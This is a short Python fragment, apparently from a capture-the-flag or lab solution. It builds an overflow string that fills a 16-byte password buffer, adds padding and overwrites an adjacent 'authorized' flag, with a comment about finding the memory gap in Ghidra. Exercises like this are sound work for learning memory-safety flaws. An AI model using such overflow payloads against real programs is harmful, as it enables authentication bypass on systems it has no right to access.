...
def exploit_basic_overflow() -> str:
    """
    char password[16]; // 16 bytes
    int authorized = 0; // 4 bytes

    Password occupies bytes 0 through 15.
    Through ghidra you can see that there is a gap in memory between password and authorised.
    """
    # Fills the 16-byte password buffer
    buffer = "X" * 16
    # Add the padding - the size of the padding does not matter
    buffer += "X" * 20
    # Overwrites the 'authorized' variable with a non-zero value
    buffer += "X"
